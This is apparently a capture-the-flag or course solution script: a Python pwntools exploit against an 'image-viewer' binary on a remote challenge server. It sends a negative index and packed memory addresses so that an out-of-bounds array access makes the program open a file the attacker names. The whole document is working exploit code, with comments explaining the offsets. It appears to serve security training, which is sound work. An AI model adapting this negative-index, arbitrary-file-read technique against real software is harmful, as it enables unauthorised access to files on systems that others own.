#!usr/bin/python

from pwn import *

global p
global elf

def start():
    prog  = "./image-viewer"
    ip   = "plsdonthaq.me"
    port = 5003

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog, """ c """)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

p = start()
p.sendlineafter("> ", "trivial")

payload = b"-15" + b" " * 0x5       # the offset between the start of images[] and the start of buf[]
payload += p32(-15 & (0xFFFFFFFF))  # the offset as hex
payload += p32(0x804c060 + 0x10)    # the start of hex in memory + the offset to the following string
payload += "./flat earth truth"     # the name of the file to open
p.sendlineafter("> ", payload)

p.interactive()
p.close()